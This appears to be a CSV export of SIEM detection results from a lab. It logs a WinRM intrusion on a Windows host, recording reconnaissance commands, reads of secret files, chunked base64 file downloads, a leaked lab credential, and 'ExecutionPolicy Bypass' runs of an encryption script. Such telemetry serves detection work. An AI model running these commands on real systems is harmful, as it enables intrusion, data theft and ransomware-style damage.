DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:11:00.580+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:11:00.760+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xufcimbw.wct.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xufcimbw.wct.ps1","null
null"
"2025-11-18T11:11:01.158+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:29.806+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:11:29.849+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:32.485+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","whoami
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
whoami
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:40.353+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat secret.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat secret.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:44.562+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:12:49.875+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:12:49.921+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:12:58.565+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt.recovered.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat data_important.txt.recovered.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:13:23.514+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:13:23.543+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:13:23.686+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ymxp41bl.qaw.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ymxp41bl.qaw.ps1","null
null"
"2025-11-18T11:13:24.080+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:13:24.086+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-18T11:13:24.134+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-18T11:13:24.141+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-18T11:13:24.210+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}
Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}"
"2025-11-18T11:13:24.239+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}
Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}"
"2025-11-18T11:13:24.347+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:01.571+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:14:01.608+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-item 'C:\Program Files\data_important.txt.encrypted').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-item 'C:\Program Files\data_important.txt.encrypted').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:01.663+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:14:01.786+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_4s4jcrhp.urf.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_4s4jcrhp.urf.ps1","null
null"
"2025-11-18T11:14:02.137+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:02.317+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:14:02.449+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ykyq3nvf.10k.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ykyq3nvf.10k.ps1","null
null"
"2025-11-18T11:14:02.744+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 106
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt.encrypted"")
$index = 106
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:14:51.819+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:14:51.868+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:15:23.342+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:16:04.716+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:16:33.677+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:16:33.716+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:17:16.257+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:17:16.257+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:17:16.274+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:17:16.274+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:01.501+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-02T16:21:02.346+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_hjmo1kq3.5fm.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_hjmo1kq3.5fm.ps1","null
null"
"2025-12-02T16:21:03.120+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:08.167+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:11.476+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","dir
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
dir
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:18.684+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'evil-winrm -i 10.10.10.129 -u thanh -p 'thanh''
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'evil-winrm -i 10.10.10.129 -u thanh -p 'thanh''
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:26.223+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:27.456+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null",";s
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
;s
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:27.602+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_i50iofuk.ub4.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_i50iofuk.ub4.ps1","null
null"
"2025-12-02T16:21:29.412+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_o50la012.cel.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_o50la012.cel.ps1","null
null"
"2025-12-02T16:21:32.099+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:48.276+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-02T16:21:48.523+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_gz4fiv1j.vpn.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_gz4fiv1j.vpn.ps1","null
null"
"2025-12-02T16:21:48.978+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:48.985+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
